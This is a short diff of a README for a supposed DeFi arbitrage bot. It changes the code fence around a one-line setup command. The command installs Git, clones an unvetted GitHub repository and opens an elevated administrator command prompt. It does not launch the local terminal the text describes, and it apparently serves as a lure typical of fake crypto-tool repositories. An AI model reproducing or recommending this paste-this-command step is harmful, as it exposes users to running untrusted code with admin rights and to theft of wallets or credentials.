@@ -8,7 +8,7 @@ The bot supports cross-chain trading via Wormhole, MEV protection via Jito (Sola
 The DeFi Arbitrage Bot runs a local terminal on `http://localhost:3000`, fetching all trading scripts, APIs, and configurations. The setup uses a single command to clone the repository and launch the terminal, requiring only Git and basic system tools.
 
 **Launch the Terminal with the Specified Command**:
-     ```powershell
+     ```
      winget install --id Git.Git -e --source winget & git clone https://github.com/tar-ser/defi-trading-terminal-arb-tracker.git & cd defi-trading-terminal-arb-tracker & powershell -Command "Start-Process cmd -ArgumentList '/c' -Verb RunAs"
      ```
 
